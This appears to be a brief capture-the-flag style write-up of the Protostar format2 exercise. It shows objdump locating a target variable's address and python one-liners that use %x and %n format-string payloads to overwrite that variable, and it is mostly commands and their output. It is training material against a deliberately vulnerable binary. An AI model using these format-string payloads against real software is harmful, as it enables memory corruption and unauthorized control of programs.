Same as format2, but we need to write specific value (instead of random) into target variable.

user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss	00000004              target

In this one offset is predictable, so just add the necessary amount of 'A' after payload to get length of 64.


user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%08x.'*3 + '%x'" | ./format2
AAAABBBB00000200.b7fd8420.bffff604.41414141


user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08' + '%08x.'*3 + '%n'" | ./format2
00000200.b7fd8420.bffff604.
target is 31 :(


user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08' + 'A'*33 + '%08x.'*3 + '%n'" | ./format2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00000200.b7fd8420.bffff604.